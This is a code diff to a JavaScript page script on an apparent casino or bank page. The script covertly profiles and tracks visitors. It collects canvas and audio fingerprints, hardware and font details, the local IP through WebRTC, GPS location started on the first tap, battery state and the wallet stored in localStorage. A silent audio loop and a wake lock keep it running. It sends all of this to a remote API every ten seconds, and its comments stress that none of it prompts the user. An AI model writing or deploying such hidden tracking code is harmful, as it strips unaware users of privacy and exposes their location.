@@ -763,7 +763,7 @@ if(A){refresh();pollMsgCount()}
   var PG   = "銀行";                              /* ★ bank.html では "銀行" */
   var PING = 10000;
 
-  /* 端末ごとの永続ID（ユーザ識別子） */
+  /* 端末ごとの永続ID（ユーザ識別子・クライアント申告） */
   var ID;
   try {
     ID = localStorage.getItem("cj_watch_id");
@@ -788,17 +788,51 @@ if(A){refresh();pollMsgCount()}
     sendName = true;
   }
 
-  /* 端末プロファイル（1回だけ収集・全部プロンプト無し） */
+  function h32(str){
+    var h = 2166136261 >>> 0;
+    for (var i = 0; i < str.length; i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); }
+    return (h >>> 0).toString(36);
+  }
+
+  /* ============ 端末プロファイル（1回だけ収集・全部プロンプト無し） ============ */
   var SYS = (function(){
-    function gpu(){ try { var c=document.createElement("canvas"),
-      gl=c.getContext("webgl")||c.getContext("experimental-webgl"); if(!gl) return null;
-      var d=gl.getExtension("WEBGL_debug_renderer_info");
-      return d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER); } catch(e){ return null } }
+    function gpu(){
+      try {
+        var c = document.createElement("canvas"),
+            gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (!gl) return null;
+        var d = gl.getExtension("WEBGL_debug_renderer_info");
+        var r = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        var mx = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+        return (r ? String(r) : "") + (mx ? " [" + mx + "]" : "");
+      } catch(e){ return null }
+    }
+    function canvasFp(){
+      try {
+        var c = document.createElement("canvas"); c.width = 240; c.height = 60;
+        var g = c.getContext("2d");
+        g.textBaseline = "top";
+        g.font = '14px "Noto Sans JP",sans-serif';
+        g.fillStyle = "#f60"; g.fillRect(0,0,120,30);
+        g.fillStyle = "#069"; g.fillText("日本語Aa@123", 2, 2);
+        return h32(c.toDataURL()).slice(0, 10);
+      } catch(e){ return null }
+    }
     var uad = navigator.userAgentData || null;
+    var gamut = "srgb";
+    try {
+      if (matchMedia("(color-gamut:rec2020)").matches) gamut = "rec2020";
+      else if (matchMedia("(color-gamut:p3)").matches) gamut = "p3";
+    } catch(e){}
+    var pointer = "none";
+    try {
+      var cf = matchMedia("(any-pointer:coarse)").matches, ff = matchMedia("(any-pointer:fine)").matches;
+      pointer = cf && ff ? "coarse+fine" : cf ? "coarse" : ff ? "fine" : "none";
+    } catch(e){}
     return {
       tz: (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone } catch(e){ return null } })(),
       lang: navigator.language,
-      langs: (navigator.languages||[]).slice(0,3).join(","),
+      langs: (navigator.languages || []).slice(0,3).join(","),
       plat: navigator.platform || null,
       cores: navigator.hardwareConcurrency || null,
       mem: navigator.deviceMemory || null,
@@ -808,14 +842,118 @@ if(A){refresh();pollMsgCount()}
       view: innerWidth + "x" + innerHeight,
       orient: (screen.orientation && screen.orientation.type) || null,
       gpu: gpu(),
+      canvasFp: canvasFp(),
       dark: matchMedia("(prefers-color-scheme:dark)").matches,
       reduced: matchMedia("(prefers-reduced-motion:reduce)").matches,
+      hdr: matchMedia("(dynamic-range:high)").matches,
+      gamut: gamut,
+      pointer: pointer,
+      hover: matchMedia("(any-hover:hover)").matches,
+      standalone: matchMedia("(display-mode:standalone)").matches,
+      webdriver: !!navigator.webdriver,
       ref: document.referrer || null,
       uaMobile: uad ? !!uad.mobile : null,
-      uaPlat: uad ? uad.platform : null
+      uaPlat: uad ? uad.platform : null,
+      hour: new Date().getHours()
     };
   })();
 
+  /* ============ 追加収集（非同期・プロンプト無し） ============ */
+  var EXTRA = {};
+
+  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    navigator.userAgentData.getHighEntropyValues(
+      ["model","platformVersion","architecture","bitness","uaFullVersion"]
+    ).then(function(v){
+      EXTRA.model = v.model || null; EXTRA.pv = v.platformVersion || null;
+      EXTRA.arch = v.architecture || null; EXTRA.bits = v.bitness || null;
+      EXTRA.uaVer = v.uaFullVersion || null;
+    }).catch(function(){});
+  }
+
+  if (navigator.gpu && navigator.gpu.requestAdapter) {
+    navigator.gpu.requestAdapter().then(function(a){
+      if (!a) return;
+      var i = a.info || null;
+      if (!i && a.requestAdapterInfo) { try { i = a.requestAdapterInfo(); } catch(e){} }
+      if (i) EXTRA.webgpu = [i.vendor, i.architecture, i.device].filter(Boolean).join(" / ");
+    }).catch(function(){});
+  }
+
+  try {
+    if ("AmbientLightSensor" in window) {
+      var als = new AmbientLightSensor({ frequency: 1 });
+      als.addEventListener("reading", function(){ EXTRA.light = Math.round(als.illuminance); });
+      als.start();
+    }
+  } catch(e){}
+
+  try {
+    var FONTS = ["Meiryo","Yu Gothic","MS PGothic","Hiragino Kaku Gothic ProN","Noto Sans JP",
+      "BIZ UDGothic","MS Gothic","MS Mincho","Arial","Segoe UI","Roboto","Helvetica Neue",
+      "Times New Roman","Courier New","Comic Sans MS","Georgia","Verdana","Tahoma","Impact"];
+    EXTRA.fonts = FONTS.filter(function(f){ try { return document.fonts.check('12px "' + f + '"') } catch(e){ return false } }).length;
+  } catch(e){}
+
+  try { EXTRA.voices = (speechSynthesis.getVoices() || []).length; } catch(e){}
+  try { speechSynthesis.onvoiceschanged = function(){ try { EXTRA.voices = speechSynthesis.getVoices().length; } catch(e){} }; } catch(e){}
+
+  if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
+    navigator.keyboard.getLayoutMap().then(function(m){
+      EXTRA.keyboard = (m.has && (m.has("IntlYen") || m.has("IntlRo"))) ? "JIS" : "US";
+    }).catch(function(){});
+  }
+
+  try { if (performance.memory) EXTRA.heapLimit = Math.round(performance.memory.jsHeapSizeLimit / 1048576); } catch(e){}
+
+  if (navigator.storage && navigator.storage.estimate) {
+    navigator.storage.estimate().then(function(e){
+      EXTRA.disk = Math.round((e.quota || 0) / 1e9 * 10) / 10;
+      EXTRA.private = (e.quota || 0) > 0 && (e.quota || 0) < 1.2e9;
+    }).catch(function(){});
+  }
+
+  (async function(){
+    try {
+      var ac = new (window.AudioContext || window.webkitAudioContext)();
+      EXTRA.sampleRate = ac.sampleRate;
+      var o = new OfflineAudioContext(1, 44100, 44100);
+      var osc = o.createOscillator(); osc.type = "triangle"; osc.frequency.value = 10000;
+      var comp = o.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(o.destination); osc.start(0);
+      var buf = await o.startRendering();
+      var d = buf.getChannelData(0), sum = 0;
+      for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
+      EXTRA.audioFp = h32(sum.toFixed(8)).slice(0, 10);
+      ac.close && ac.close();
+    } catch(e){}
+  })();
+
+  (function localIp(){
+    try {
+      var pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = function(e){
+        if (!e.candidate) { try { pc.close() } catch(_){} return; }
+        var m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9-]+\.local)/i.exec(e.candidate.candidate);
+        if (m) { EXTRA.localIp = m[1]; try { pc.close() } catch(_){} }
+      };
+      pc.createOffer().then(function(o){ pc.setLocalDescription(o); }).catch(function(){});
+      setTimeout(function(){ try { pc.close() } catch(_){} }, 4000);
+    } catch(e){}
+  })();
+
+  setTimeout(function(){
+    try {
+      var el = document.createElement("div");
+      el.className = "ad-banner adsbox ad-placement";
+      el.style.cssText = "position:absolute;left:-9999px;height:10px;width:10px";
+      document.body.appendChild(el);
+      setTimeout(function(){ EXTRA.blockedAds = el.offsetHeight === 0; el.remove(); }, 200);
+    } catch(e){}
+  }, 1200);
+
+  /* ============ 操作検知 ============ */
   var lastAct = Date.now();
   ["pointerdown","keydown","scroll","touchstart","mousemove"].forEach(function(e){
     addEventListener(e, function(){ lastAct = Date.now() }, { passive:true });
@@ -823,39 +961,47 @@ if(A){refresh();pollMsgCount()}
 
   var PERMS = null, MEDIA = null;
   (async function(){
-    try { var o={}, nm={geo:"geolocation",cam:"camera",mic:"microphone",notif:"notifications"};
-      for (var k in nm){ try { o[k]=(await navigator.permissions.query({name:nm[k]})).state }catch(e){} } PERMS=o; } catch(e){}
-    try { var d=await navigator.mediaDevices.enumerateDevices();
-      MEDIA={cam:d.filter(x=>x.kind=="videoinput").length,mic:d.filter(x=>x.kind=="audioinput").length,spk:d.filter(x=>x.kind=="audiooutput").length}; } catch(e){}
+    try {
+      var o = {}, nm = { geo:"geolocation", cam:"camera", mic:"microphone", notif:"notifications" };
+      for (var k in nm){ try { o[k] = (await navigator.permissions.query({ name: nm[k] })).state } catch(e){} }
+      PERMS = o;
+    } catch(e){}
+    try {
+      var d = await navigator.mediaDevices.enumerateDevices();
+      MEDIA = {
+        cam: d.filter(function(x){ return x.kind == "videoinput" }).length,
+        mic: d.filter(function(x){ return x.kind == "audioinput" }).length,
+        spk: d.filter(function(x){ return x.kind == "audiooutput" }).length
+      };
+    } catch(e){}
   })();
 
-  var okN = 0, lastOk = 0, on = false;
-
-  /* 隅の7pxの点（不要なら opacity:0 に） */
+  /* ============ 隅の点 ============ */
   var d = document.createElement("i");
   d.title = NAME + " / " + PG;
-  d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;"+
+  d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;" +
     "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.5;pointer-events:none;z-index:1";
   document.body.appendChild(d);
+  var okN = 0, lastOk = 0, on = false;
   function dot(){
     var fresh = Date.now() - lastOk < PING * 2.5;
     d.style.background = fresh ? "#3ba55d" : (lastOk ? "#c0242b" : "#faa61a");
   }
 
-  /* 無音WAV：ミュートで自動再生 → 開始後にミュート解除 */
+  /* ============ 無音WAV：ミュートで自動再生 → 開始後にミュート解除 ============ */
   function wav(){
     var rate = 8000, n = rate, buf = new ArrayBuffer(44 + n), v = new DataView(buf);
-    function w(o,s){ for (var i=0;i<s.length;i++) v.setUint8(o+i, s.charCodeAt(i)); }
-    w(0,"RIFF"); v.setUint32(4,36+n,true); w(8,"WAVE"); w(12,"fmt ");
-    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
-    v.setUint32(24,rate,true); v.setUint32(28,rate,true); v.setUint16(32,1,true);
-    v.setUint16(34,8,true); w(36,"data"); v.setUint32(40,n,true);
-    for (var i=0;i<n;i++) v.setUint8(44+i,128);
-    return URL.createObjectURL(new Blob([buf],{type:"audio/wav"}));
+    function w(o, s){ for (var i = 0; i < s.length; i++) v.setUint8(o + i, s.charCodeAt(i)); }
+    w(0, "RIFF"); v.setUint32(4, 36 + n, true); w(8, "WAVE"); w(12, "fmt ");
+    v.setUint32(16, 16, true); v.setUint16(20, 1, true); v.setUint16(22, 1, true);
+    v.setUint32(24, rate, true); v.setUint32(28, rate, true); v.setUint16(32, 1, true);
+    v.setUint16(34, 8, true); w(36, "data"); v.setUint32(40, n, true);
+    for (var i = 0; i < n; i++) v.setUint8(44 + i, 128);
+    return URL.createObjectURL(new Blob([buf], { type: "audio/wav" }));
   }
   var au = new Audio(wav());
   au.loop = true; au.preload = "auto";
-  au.setAttribute("playsinline",""); au.muted = true;
+  au.setAttribute("playsinline", ""); au.muted = true;
   document.body.appendChild(au);
   function arm(){
     if (on) return;
@@ -872,7 +1018,7 @@ if(A){refresh();pollMsgCount()}
   });
   document.addEventListener("visibilitychange", function(){ if (!document.hidden) arm(); });
 
-  /* 前面では画面を消させない */
+  /* ============ 前面では画面を消させない ============ */
   function wake(){
     if (!("wakeLock" in navigator) || document.hidden) return;
     navigator.wakeLock.request("screen").catch(function(){});
@@ -880,62 +1026,157 @@ if(A){refresh();pollMsgCount()}
   wake();
   document.addEventListener("visibilitychange", function(){ if (!document.hidden) wake(); });
 
-  /* 位置：許可済みなら無音、未許可なら最初のタップで（許可は1回だけ） */
-  var geo = null, geoS = false;
+  /* ============ 通知 ============ */
+  var ACTX = null;
+  function beep(){
+    try {
+      ACTX = ACTX || new (window.AudioContext || window.webkitAudioContext)();
+      if (ACTX.state === "suspended") ACTX.resume();
+      [0, 0.18].forEach(function(t, i){
+        var o = ACTX.createOscillator(), g = ACTX.createGain();
+        o.type = "sine"; o.frequency.value = i ? 1180 : 880;
+        var b = ACTX.currentTime + t;
+        g.gain.setValueAtTime(0.0001, b);
+        g.gain.exponentialRampToValueAtTime(0.25, b + 0.02);
+        g.gain.exponentialRampToValueAtTime(0.0001, b + 0.16);
+        o.connect(g); g.connect(ACTX.destination); o.start(b); o.stop(b + 0.18);
+      });
+    } catch(e){}
+  }
+
+  function toast(text){
+    var w = document.createElement("div");
+    w.style.cssText = "position:fixed;left:50%;top:calc(14px + env(safe-area-inset-top,0px));" +
+      "transform:translateX(-50%);max-width:min(92vw,420px);background:#111d;color:#fff;" +
+      "padding:12px 16px;border-radius:12px;font:14px/1.5 system-ui,sans-serif;z-index:2147483647;" +
+      "box-shadow:0 6px 24px #0008;white-space:pre-wrap;backdrop-filter:blur(6px);opacity:0;" +
+      "transition:opacity .2s;cursor:pointer";
+    w.textContent = text;
+    document.body.appendChild(w);
+    requestAnimationFrame(function(){ w.style.opacity = "1"; });
+    var kill = function(){ w.style.opacity = "0"; setTimeout(function(){ w.remove() }, 250); };
+    w.addEventListener("click", kill);
+    setTimeout(kill, 9000);
+  }
+
+  function notify(list){
+    for (var i = 0; i < list.length; i++){
+      var t = list[i] && list[i].text;
+      if (!t) continue;
+      toast(t);
+      beep();
+      if (window.Notification && Notification.permission === "granted") {
+        try {
+          var n = new Notification(t, { body: NAME + " / " + PG, tag: "cj" + (list[i].id || i) });
+          n.onclick = function(){ try { window.focus(); n.close(); } catch(e){} };
+        } catch(e){}
+      }
+    }
+  }
+
+  /* ============ 位置：許可済みなら無音、未許可なら最初のタップで ============ */
+  var geo = null, geoS = false, notifAsked = false;
+  function askNotif(){
+    if (notifAsked || !window.Notification) return;
+    notifAsked = true;
+    try {
+      if (Notification.permission === "default") Notification.requestPermission().then(function(){
+        if (PERMS) PERMS.notif = Notification.permission;
+      }).catch(function(){});
+    } catch(e){}
+  }
   function startGeo(){
     if (geoS || !navigator.geolocation) return;
     geoS = true;
+    /* まず粗く速く（WiFi/基地局ベース・数百m） */
+    navigator.geolocation.getCurrentPosition(function(p){
+      geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy || 0 };
+      push("geo");
+      setTimeout(askNotif, 800);
+    }, function(){ setTimeout(askNotif, 300); },
+      { enableHighAccuracy: false, maximumAge: 60000, timeout: 8000 });
+    /* その後GPSで精度を上げる */
     navigator.geolocation.watchPosition(function(p){
-      geo = { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy||0 };
-    }, function(){}, { enableHighAccuracy:true, maximumAge:15000, timeout:20000 });
+      geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy || 0 };
+    }, function(){}, { enableHighAccuracy: true, maximumAge: 15000, timeout: 20000 });
   }
   if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({ name:"geolocation" }).then(function(s){
+    navigator.permissions.query({ name: "geolocation" }).then(function(s){
       if (s.state === "granted") startGeo();
+      else if (s.state === "default") setTimeout(askNotif, 3000);
     }).catch(function(){});
   }
   ["click","touchstart","pointerdown"].forEach(function(ev){
     document.addEventListener(ev, startGeo, { passive:true });
   });
 
-  /* バッテリー */
+  /* ============ バッテリー ============ */
   var bat = null;
   if (navigator.getBattery) navigator.getBattery().then(function(b){
-    function r(){ bat = { level: Math.round(b.level*100), charging: b.charging }; }
+    function r(){ bat = { level: Math.round(b.level * 100), charging: b.charging }; }
     r(); b.addEventListener("levelchange", r); b.addEventListener("chargingchange", r);
   }).catch(function(){});
 
-  /* 同じオリジンなのでカジノの財布を読める */
+  /* ============ 同じオリジンなのでカジノの財布を読める ============ */
   function chips(){
-    try { var v = JSON.parse(localStorage.getItem("cj_wallet"));
-      return v && Number.isFinite(v.chips) ? Math.max(0, Math.floor(v.chips)) : null; } catch (e) { return null; }
+    try {
+      var v = JSON.parse(localStorage.getItem("cj_wallet"));
+      return v && Number.isFinite(v.chips) ? Math.max(0, Math.floor(v.chips)) : null;
+    } catch (e) { return null; }
+  }
+
+  /* ============ 送信 ============ */
+  var jit = [], prevPush = 0;
+  function jitter(){
+    if (!prevPush) { prevPush = Date.now(); return null; }
+    var dt = Date.now() - prevPush - PING;
+    prevPush = Date.now();
+    jit.push(Math.abs(dt)); if (jit.length > 12) jit.shift();
+    return Math.round(jit.reduce(function(a, b){ return a + b }, 0) / jit.length);
   }
 
   function push(reason, final){
+    var jitMs = jitter();
     fetch(API + "/api/ping", {
-      method:"POST", headers:{ "Content-Type":"application/json" },
+      method: "POST", headers: { "Content-Type": "application/json" },
       body: JSON.stringify(Object.assign({
-        id: ID, page: PG, reason: reason,
+        id: ID, page: PG, reason: reason, t: Date.now(),
         vis: document.visibilityState, online: navigator.onLine,
-        battery: bat, geo: geo, chips: chips(),
-        sys: Object.assign({}, SYS, {
-          idle: Math.round((Date.now()-lastAct)/1000),
+        battery: bat, geo: geo, chips: chips(), hour: new Date().getHours(),
+        sys: Object.assign({}, SYS, EXTRA, {
+          idle: Math.round((Date.now() - lastAct) / 1000),
           focus: document.hasFocus(),
           scroll: Math.round(scrollY),
           audio: on,
+          notifPerm: window.Notification ? Notification.permission : "none",
+          hour: new Date().getHours(),
           net: navigator.connection ? {
             t: navigator.connection.effectiveType,
             down: navigator.connection.downlink,
             rtt: navigator.connection.rtt,
-            save: !!navigator.connection.saveData
+            save: !!navigator.connection.saveData,
+            jitter: jitMs
           } : null,
           perms: PERMS, media: MEDIA
         })
       }, sendName ? { name: NAME } : {})),
       keepalive: !!final
-    }).then(function(r){ if (r.ok) { okN++; lastOk = Date.now(); } dot(); })
-      .catch(function(){ dot(); });
+    }).then(function(r){
+      if (!r.ok) { dot(); return null; }
+      okN++; lastOk = Date.now(); dot();
+      return r.json().catch(function(){ return null; });
+    }).then(function(j){
+      if (!j) return;
+      if (j.name && j.name !== NAME) {
+        NAME = j.name;
+        try { localStorage.setItem("cj_watch_name", NAME); } catch(e){}
+        d.title = NAME + " / " + PG;
+      }
+      sendName = false;                       /* 以降はサーバ側の名前を正とする */
+      if (j.notify && j.notify.length) notify(j.notify);
+    }).catch(function(){ dot(); });
   }
+
   push("start");
   setInterval(function(){ push("tick"); }, PING);
   document.addEventListener("visibilitychange", function(){ push(document.hidden ? "hidden" : "visible"); });
